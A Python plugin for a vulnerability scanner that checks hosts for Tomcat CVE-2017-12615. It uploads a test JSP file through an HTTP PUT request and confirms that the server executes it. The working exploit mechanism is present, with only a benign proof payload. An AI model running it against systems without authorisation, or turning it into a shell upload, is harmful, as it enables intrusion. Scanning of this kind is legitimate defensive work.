#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Reference: https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/tomcat_cve_017_12615.py

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'tomcat_put'
        self.info = "Check the Tomcat PUT RCE CVE-2017-12615"
        self.keyword = ['all', 'tomcat', 'rce', 'put', 'intranet', 'web', 'danger', 'cve_2017_12615']
        self.default_ports_list = WEB_PORTS_LIST
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        random_num = ''.join(str(i) for i in random.sample(range(0,9),4))
        payload = "<%out.println(" + random_num + "*4);%>"
        check_num = int(random_num) * 4
        filename = random8string()
        url1 = "http://%s:%d/%s.jsp"%(ip, port, filename) if add_web_path == "" else "http://%s:%d/%s/%s.jsp"%(ip, port, add_web_path, filename)
        url2 = "https://%s:%d/%s.jsp"%(ip, port, filename) if add_web_path == "" else "https://%s:%d/%s/%s.jsp"%(ip, port, add_web_path, filename)
        try:
            req = Requester(url1+"/", method="put", data=payload, noencode=True)
            req = Requester(url1)
            if str(check_num) in req.html:
                result = "exists Tomcat PUT RCE CVE-2017-12615, check url: %s"%(url1)
                self._output(ip, port, result)
        except RequesterOpenError:
            try:
                req = Requester(url2+"/", method="put", data=payload, noencode=True)
                req = Requester(url2)
                if str(check_num) in req.html:
                    result = "exists Tomcat PUT RCE CVE-2017-12615, check url: %s"%(url2)
                    self._output(ip, port, result)
            except: pass
        except: pass

globals()['VulnChecker'] = VulnChecker